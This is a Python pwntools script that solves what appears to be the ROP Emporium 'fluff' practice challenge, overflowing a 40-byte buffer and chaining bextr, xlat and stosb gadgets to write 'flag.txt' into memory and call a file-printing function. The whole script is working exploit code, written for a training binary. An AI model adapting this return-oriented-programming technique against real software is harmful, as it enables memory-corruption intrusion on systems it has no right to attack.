import pwn
from pwn import *

context.binary = ELF('./fluff')
s = process('./fluff')

xlat = 0x0000000000400628
stosb = 0x0000000000400639
bextr = 0x0000000000400633
pop_rdi = 0x00000000004006a3
bss = 0x0000000000601038
func = 0x400510
flag_mem = [0x3c4, 0x239, 0x3d6, 0x3cf, 0x24e, 0x192, 0x246, 0x192]
mem_loc = []
rax = 0xb
for i  in flag_mem:
    mem_loc.append(hex(i + 0x400000))

flag = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
payload = b""
payload += b"A"*40

for i in range(0,8):
    if(i!=0):
       rax = ord(flag[i-1])
    payload += p64(bextr)
    payload += p64(0x4000)
    p = int(mem_loc[i], 16) - rax - 0x3ef2 
    payload += p64(p)
    payload += p64(xlat)
    payload += p64(pop_rdi)
    payload += p64(bss+i)
    payload += p64(stosb)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(func)

s.sendline(payload)
s.interactive()
